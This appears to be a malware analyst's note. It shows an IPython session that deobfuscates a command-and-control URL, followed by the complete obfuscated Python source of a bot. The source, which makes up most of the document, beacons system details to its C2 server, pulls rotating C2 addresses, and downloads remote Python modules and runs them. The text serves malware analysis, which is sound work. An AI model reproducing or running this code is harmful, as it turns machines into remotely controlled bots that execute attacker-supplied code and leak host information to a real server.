## easy CnC ip
### export from evernote (created 06.08.2019)

```python
➜  ~ ipython
Python 3.7.2 (default, Feb 12 2019, 08:15:36)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.4.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: def l1ll1ll1l_dk_ (l1lllll_dk_):
   ...:     global l11111_dk_
   ...:     l1l11111_dk_ = ord (l1lllll_dk_ [-1])
   ...:     l11111ll_dk_ = l1lllll_dk_ [:-1]
   ...:     l1lll1ll_dk_ = l1l11111_dk_ % len (l11111ll_dk_)
   ...:     l1ll1l1_dk_ = l11111ll_dk_ [:l1lll1ll_dk_] + l11111ll_dk_ [l1lll1ll_dk_:]
   ...:     if l1llll_dk_:
   ...:         l1ll11_dk_ = unicode () .join ([unichr (ord (char) - l1ll1lll_dk_ - (l1l11_dk_ + l1l11111_dk_) % l111111l_dk_) for l1l11_dk_, char in enumerate (l1ll1l1_dk_)])
   ...:     else:
   ...:         l1ll11_dk_ = str () .join ([chr (ord (char) - l1ll1lll_dk_ - (l1l11_dk_ + l1l11111_dk_) % l111111l_dk_) for l1l11_dk_, char in enumerate (l1ll1l1_dk_)])
   ...:


In [2]: import sys
   ...: l1llll_dk_ = sys.version_info [0] == 2


In [3]: l1ll1lll_dk_ = 2048


In [4]: l111111l_dk_ = 7
    ...:


In [5]: l1ll1ll1l_dk_((u"ࠧ࡮ࡴࡵࡲ࠽࠳࠴࠾࠳࠯࠳࠹࠺࠳࠸࠴࠱࠰࠴࠴࠼࠵ࡢࠣࢰ"))


In [6]: def l1ll1ll1l_dk_ (l1lllll_dk_):
    ...:     global l11111_dk_
    ...:     l1l11111_dk_ = ord (l1lllll_dk_ [-1])
    ...:     l11111ll_dk_ = l1lllll_dk_ [:-1]
    ...:     l1lll1ll_dk_ = l1l11111_dk_ % len (l11111ll_dk_)
    ...:     l1ll1l1_dk_ = l11111ll_dk_ [:l1lll1ll_dk_] + l11111ll_dk_ [l1lll1ll_dk_:]
    ...:     print(l1ll1l1_dk_)
    ...:     if l1llll_dk_:
    ...:         l1ll11_dk_ = unicode () .join ([unichr (ord (char) - l1ll1lll_dk_ - (l1l11_dk_ + l1l11111_dk_) % l111111l_dk_) for l1l11_dk_, char in enumerate (l1ll1l1_dk_)])
    ...:         print(l1ll11_dk_) # mda1
    ...:     else:
    ...:         l1ll11_dk_ = str () .join ([chr (ord (char) - l1ll1lll_dk_ - (l1l11_dk_ + l1l11111_dk_) % l111111l_dk_) for l1l11_dk_, char in enumerate (l1ll1l1_dk_)])
    ...:         print(l1ll11_dk_) # mda2
    ...:


In [7]: l1ll1ll1l_dk_((u"ࠧ࡮ࡴࡵࡲ࠽࠳࠴࠾࠳࠯࠳࠹࠺࠳࠸࠴࠱࠰࠴࠴࠼࠵ࡢࠣࢰ"))
 ࠧ࡮ࡴࡵࡲ࠽࠳࠴࠾࠳࠯࠳࠹࠺࠳࠸࠴࠱࠰࠴࠴࠼࠵ࡢࠣ # mda1
"http://83.166.240.107/b" # mda2


In [8]:

```

___

## source code:
### such a way of obfuscation

```python
# coding: UTF-8
import sys
l1llll_dk_ = sys.version_info [0] == 2
l1ll1lll_dk_ = 2048
l111111l_dk_ = 7
def l1ll1ll1l_dk_ (l1lllll_dk_):
    global l11111_dk_
    l1l11111_dk_ = ord (l1lllll_dk_ [-1])
    l11111ll_dk_ = l1lllll_dk_ [:-1]
    l1lll1ll_dk_ = l1l11111_dk_ % len (l11111ll_dk_)
    l1ll1l1_dk_ = l11111ll_dk_ [:l1lll1ll_dk_] + l11111ll_dk_ [l1lll1ll_dk_:]
    if l1llll_dk_:
        l1ll11_dk_ = unicode () .join ([unichr (ord (char) - l1ll1lll_dk_ - (l1l11_dk_ + l1l11111_dk_) % l111111l_dk_) for l1l11_dk_, char in enumerate (l1ll1l1_dk_)])
    else:
        l1ll11_dk_ = str () .join ([chr (ord (char) - l1ll1lll_dk_ - (l1l11_dk_ + l1l11111_dk_) % l111111l_dk_) for l1l11_dk_, char in enumerate (l1ll1l1_dk_)])
    return eval (l1ll11_dk_)
import tempfile
import os
import platform
import time
import urllib2
import urllib
import random
from threading import Thread
from multiprocessing import Process
import sys
def l1l11111l_dk_(str,mode):
    if(not mode):
        str = str.replace(l1ll1ll1l_dk_ (u"ࠢࡠࠤࡳ"),l1ll1ll1l_dk_ (u"ࠣࠢࠥࡴ"))
    res = l1ll1ll1l_dk_ (u"ࠤࠥࡵ")
    for x in range(0,len(str)):
        a = ord(str[x])
        b = 90
        res += chr(a ^ b) #chr((a and not b) or (not a and b))
    if (mode):
        res = res.replace(l1ll1ll1l_dk_ (u"ࠥࠤࠧࡶ"), l1ll1ll1l_dk_ (u"ࠦࡤࠨࡷ"))
    return res
def l1l1l111l_dk_(url):
    try:
        req = urllib2.Request(url)
        response = urllib2.urlopen(req)
        l1l111111_dk_ = response.read()
        return l1l111111_dk_
    except:
        return l1ll1ll1l_dk_ (u"ࠧࠨࡸ")
def l1ll11ll1_dk_():
    l1l1l1111_dk_ = l1ll1ll1l_dk_ (u"ࠨࡤ࡬࠰ࡧࡥࡹࠨࡹ")
    try:
        if os.path.isfile(l1l1l1111_dk_):
            f = open(l1l1l1111_dk_,l1ll1ll1l_dk_ (u"ࠧࡳࠩࡺ"))
            l1l11ll1l_dk_ = f.read().strip()
            f.close()
            return l1l11ll1l_dk_
        l1l11lll1_dk_ = random.randint(1,100000)
        l1l11l11l_dk_ = open(l1l1l1111_dk_, l1ll1ll1l_dk_ (u"ࠣࡹࠥࡻ"))
        l1l11l11l_dk_.write(str(l1l11lll1_dk_))
        l1l11l11l_dk_.close()
        return str(l1l11lll1_dk_)
    except:
        return l1ll1ll1l_dk_ (u"ࠤ࠴ࠦࡼ")
def l1l1l1lll_dk_():
    l1l11l1ll_dk_ = l1ll1ll1l_dk_ (u"ࠥ࡬ࡴࡹࡴ࠯ࡦࡤࡸࠧࡽ");
    l1l11l1ll_dk_ = l1l11l1ll_dk_ if os.path.isfile(l1l11l1ll_dk_) else l1ll1ll1l_dk_ (u"ࠦ࠳࠴࠯࠯࠰࠲ࠦࡾ") + l1l11l1ll_dk_;
    try:
        f = open(l1l11l1ll_dk_, l1ll1ll1l_dk_ (u"ࠧࡸࠢࡿ"))
        l1l11ll1l_dk_ = f.read().strip()
        f.close()
        return l1l11ll1l_dk_
    except:
        return l1ll1ll1l_dk_ (u"ࠨࠢࢀ")
def l1l11l1l1_dk_(l1ll1l111_dk_,host,l1l1111ll_dk_,token):
    l1l1ll11l_dk_ = __import__(l1ll1l111_dk_)
    l1l1ll11l_dk_.run(host, l1l1111ll_dk_, l1ll11ll1_dk_())
class l1l1lll11_dk_:
    l1l1l11l1_dk_ = l1ll1ll1l_dk_ (u"ࠢࡩࡶࡷࡴ࠿࠵࠯ࡴࡧࡻࡶࡺࡸࡡ࠯ࡲࡺ࠳ࡵࡿ࠮ࡵࡺࡷࠦࢁ")
    l11llllll_dk_ = l1ll1ll1l_dk_ (u"ࠣࡪ࠱ࡨࡦࡺࠢࢂ")
    host = l1ll1ll1l_dk_ (u"ࠤ࡫ࡸࡹࡶ࠺࠰࠱࡯ࡳࡨࡧ࡬ࡩࡱࡶࡸ࠴ࡨࠢࢃ")
    l1l1ll1l1_dk_= l1ll1ll1l_dk_ (u"ࠥ࡬ࡹࡺࡰ࠻࠱࠲ࡰࡴࡩࡡ࡭ࡪࡲࡷࡹ࠵ࡢࠣࢄ")
    l1l1ll1ll_dk_ = l1ll1ll1l_dk_ (u"ࠦࠧࢅ")
    l1l111l1l_dk_ = l1ll1ll1l_dk_ (u"ࠧ࠵ࠢࢆ")
    l1ll111l1_dk_ = l1ll1ll1l_dk_ (u"ࠨ࠰࠯࠺ࠥࢇ")
    l1l1lllll_dk_ = []
    l1ll11l1l_dk_ = {}
    l1l1ll111_dk_ = None
    l1l11l111_dk_ = l1ll1ll1l_dk_ (u"ࠢࡥ࡭࠱ࡰࡴࡩ࡫ࠣ࢈")
    def __init__(self):
        l1ll11l11_dk_ = tempfile.gettempdir()
        self.l1l111l1l_dk_ = l1ll1ll1l_dk_ (u"ࠣ࡞࡟ࠦࢉ") if l1ll11l11_dk_.find(l1ll1ll1l_dk_ (u"ࠤ࠽ࠦࢊ"))>=0 else l1ll1ll1l_dk_ (u"ࠥ࠳ࠧࢋ")
    def l1l1lll1l_dk_(self,host):
        self.l1l1ll1l1_dk_ = host
        self.host = host
    def l1l111l11_dk_(self):
        try:
            f = open(self.l1l11l111_dk_, l1ll1ll1l_dk_ (u"ࠦࡼࠨࢌ"))
            f.write(l1ll1ll1l_dk_ (u"ࠧࡲ࡯࡭ࠤࢍ"))
            f.close()
            os.remove(self.l1l11l111_dk_)
            return True
        except:
            return False
    def l1ll111ll_dk_(self):
        try:
            self.l1l1ll111_dk_ = open(self.l1l11l111_dk_, l1ll1ll1l_dk_ (u"ࠨࡷࠣࢎ"))
            self.l1l1ll111_dk_.write(l1ll1ll1l_dk_ (u"ࠢ࡭ࡱ࡯ࠦ࢏"))
            return True
        except IOError:
            return False
    def l1l111lll_dk_(self):
        if(not self.l1l111l11_dk_()):
            return True
        self.l1ll111ll_dk_()
    def l1l1llll1_dk_(self):
        try:
            l1ll1l1ll_dk_ = open(self.l11llllll_dk_, l1ll1ll1l_dk_ (u"ࠨࡴࠪ࢐"))
            l1l111ll1_dk_ = l1l11111l_dk_(l1ll1l1ll_dk_.read().strip())
            h = l1l111ll1_dk_.split(l1ll1ll1l_dk_ (u"ࠤ࠯ࠦ࢑"))
            self.l1l1ll1l1_dk_ = h[0]
            self.host = h[0]
            self.l1l1ll1ll_dk_ = h[1]
        except:
            pass
    def l1l1l1ll1_dk_(self,l1l11llll_dk_):
        try:
            l1ll1ll11_dk_ = l1ll1ll1l_dk_ (u"ࠥࠦ࢒")
            h = l1l11llll_dk_.split(l1ll1ll1l_dk_ (u"ࠦ࠱ࠨ࢓"))
            l1l11ll1l_dk_ = l1l1l111l_dk_(h[0]+l1ll1ll1l_dk_ (u"ࠧ࠵ࡺ࠰ࡶࡨࡷࡹ࠵ࠢ࢔"))
            l1l11ll1l_dk_ = l1l11ll1l_dk_.strip()
            if(l1l11ll1l_dk_ == l1ll1ll1l_dk_ (u"ࠨ࠱ࠣ࢕")):
                l1ll1ll11_dk_ = h[0]
            if (len(h)>1):
                l1l11ll1l_dk_ = l1l1l111l_dk_(h[1] + l1ll1ll1l_dk_ (u"ࠢ࠰ࡼ࠲ࡸࡪࡹࡴ࠰ࠤ࢖"))
                l1l11ll1l_dk_ = l1l11ll1l_dk_.strip()
                if (l1l11ll1l_dk_ == l1ll1ll1l_dk_ (u"ࠣ࠳ࠥࢗ")):
                    l1ll1ll11_dk_ +=l1ll1ll1l_dk_ (u"ࠤ࠯ࠦ࢘") + h[1]
            if(l1ll1ll11_dk_):
                l1l11l11l_dk_ = open(self.l11llllll_dk_, l1ll1ll1l_dk_ (u"ࠥࡻ࢙ࠧ"))
                l1l11l11l_dk_.write(l1l11111l_dk_(l1ll1ll11_dk_,True))
                l1l11l11l_dk_.close()
        except:
            pass
    def l1l1l1l11_dk_(self, min):
        for i in range(0,min):
            for z in self.l1l1lllll_dk_:
                l1ll1l11l_dk_ = self.l1ll11l1l_dk_.get(z, False)
                if(not l1ll1l11l_dk_):
                    continue
                if(not l1ll1l11l_dk_.is_alive()):
                    self.l1l1lllll_dk_ = [x for x in self.l1l1lllll_dk_ if x != z]
                    self.l1ll11l1l_dk_.pop(z)
            time.sleep(60)
    def l1l1111l1_dk_(self, l1l1111ll_dk_,l1l1ll11l_dk_):
        l1l1ll11l_dk_.run(self.host,l1l1111ll_dk_,l1ll11ll1_dk_())
    def run(self):
        l1l11ll11_dk_ = 15
        l1l1l1l1l_dk_ = 0
        self.l1l1llll1_dk_()
        l1l1l11ll_dk_ = True
        l1ll1111l_dk_ = tempfile.gettempdir()
        while True:
            if(l1l1l1l1l_dk_ > 0):
                l1l11llll_dk_ = l1l1l111l_dk_(self.l1l1l11l1_dk_)
                l1l11llll_dk_ = l1l11llll_dk_.strip(l1ll1ll1l_dk_ (u"ࠦࡡࡴࠠ࠾ࠤ࢚"))
                if(l1l11llll_dk_):
                    l1ll11111_dk_ = l1l11111l_dk_(l1l11llll_dk_, False)
                    self.l1l1l1ll1_dk_(l1ll11111_dk_)
                    self.l1l1llll1_dk_()
                    l1l1l1l1l_dk_ = 0
            if((self.l1l1ll1ll_dk_)and(l1l1l1l1l_dk_ % 2)):
                self.host = self.l1l1ll1ll_dk_
            else:
                self.host = self.l1l1ll1l1_dk_
            geturl = self.host + l1ll1ll1l_dk_ (u"ࠧ࠵ࡢ࠰ࡥ࡫ࡩࡨࡱ࠿ࡷࡧࡵࡁ࢛ࠧ") + self.l1ll111l1_dk_ + l1ll1ll1l_dk_ (u"ࠨࠦࡰࡵࡀࠦ࢜") +urllib.quote_plus(platform.system() +l1ll1ll1l_dk_ (u"ࠢࠡࠤ࢝")+platform.release()) + l1ll1ll1l_dk_ (u"ࠣࠨࡳࡽࡹ࡮࡯࡯࠿࠴ࠪࡵࡿ࡟ࡷࡧࡵࡷ࡮ࡵ࡮࠾࠴ࠩࡸࡴࡱࡥ࡯࠿ࠥ࢞") + l1ll11ll1_dk_() + l1ll1ll1l_dk_ (u"ࠤࠩ࡬ࡴࡹࡴ࠾ࠤ࢟") + urllib.quote_plus(l1l1l1lll_dk_());
            #if(l1l1l11ll_dk_):
            data = l1l1l111l_dk_(geturl).strip()
            if (data == l1ll1ll1l_dk_ (u"ࠥࠦࢠ")):
                l1l1l1l1l_dk_+=1;
                self.l1l1l1l11_dk_(l1l11ll11_dk_)
                continue
            if ((data == l1ll1ll1l_dk_ (u"ࠦࠧࢡ")) or (data == l1ll1ll1l_dk_ (u"ࠧ࠶ࠢࢢ") ) or (data == l1ll1ll1l_dk_ (u"ࠨ࠭࠲ࠤࢣ"))):
                self.l1l1l1l11_dk_(l1l11ll11_dk_)
                continue
            l1l1l11ll_dk_ = False
            t1 = data.split(l1ll1ll1l_dk_ (u"ࠢ࠭ࠤࢤ"))
            for i in range(len(t1)):
                l1l1111ll_dk_ = int(t1[i])
                if(l1l1111ll_dk_ in self.l1l1lllll_dk_):
                    continue
                if(l1l1111ll_dk_<1):
                    continue
                filename = l1l1l111l_dk_(self.host + l1ll1ll1l_dk_ (u"ࠣ࠱ࡽ࠳࡫࡯࡬ࡦ࠱ࠥࢥ") + t1[i] + l1ll1ll1l_dk_ (u"ࠤࡂࡴࡾࡥࡶࡦࡴࡶ࡭ࡴࡴ࠽࠳ࠨࡷࡳࡰ࡫࡮࠾ࠤࢦ") + l1ll11ll1_dk_()).strip();
                if(filename == l1ll1ll1l_dk_ (u"ࠥࡧ࡭ࡧ࡮ࡨࡧࡢࡹࡷࡲࠢࢧ")):
                    l1l11llll_dk_ = l1l1l111l_dk_(self.host + l1ll1ll1l_dk_ (u"ࠦ࠴ࢀ࠯ࡪࡰࡩࡳ࠴ࠨࢨ") + t1[i] + l1ll1ll1l_dk_ (u"ࠧࡅࡣࡩࡣࡱ࡫ࡪࡻࡲ࡭࠿࠴ࠪࡹࡵ࡫ࡦࡰࡀࠦࢩ") + l1ll11ll1_dk_()).strip().lower();
                    self.l1l1l1ll1_dk_(l1l11llll_dk_)
                    self.l1l1llll1_dk_()
                    continue
                try:
                    urllib.urlretrieve(self.host+l1ll1ll1l_dk_ (u"ࠨ࠯ࡶࡲ࡯ࡳࡦࡪ࠯ࡴࡪࡨࡰࡱ࡬ࡩ࡭ࡧࡶ࠳ࠧࢪ") + filename,l1ll1ll1l_dk_ (u"ࠢࡥ࡭ࡢࠦࢫ")+ t1[i] + l1ll1ll1l_dk_ (u"ࠣ࠰ࡳࡽࠧࢬ"))
                    #l1l1ll11l_dk_ = __import__(l1ll1ll1l_dk_ (u"ࠤࡪࡦࡱࡴ࡟ࠣࢭ")+ t1[i])
                    thread = Process(target=l1l11l1l1_dk_, args=(l1ll1ll1l_dk_ (u"ࠥࡨࡰࡥࠢࢮ")+ t1[i],self.host,l1l1111ll_dk_,l1ll11ll1_dk_()))
                    self.l1ll11l1l_dk_[l1l1111ll_dk_] = thread
                    thread.start()
                    self.l1l1lllll_dk_.append(l1l1111ll_dk_)
                except:
                    continue
            self.l1l1l1l11_dk_(l1l11ll11_dk_)
if __name__ == l1ll1ll1l_dk_ (u"ࠦࡤࡥ࡭ࡢ࡫ࡱࡣࡤࠨࢯ"):
    sys.setrecursionlimit(10 ** 6)
    l1ll1l1l1_dk_ = l1l1lll11_dk_()
    if(l1ll1l1l1_dk_.l1l111lll_dk_()):
        exit()
    l1ll1l1l1_dk_.l1l1lll1l_dk_(l1ll1ll1l_dk_ (u"ࠧ࡮ࡴࡵࡲ࠽࠳࠴࠾࠳࠯࠳࠹࠺࠳࠸࠴࠱࠰࠴࠴࠼࠵ࡢࠣࢰ"))
    l1ll1l1l1_dk_.run()

```
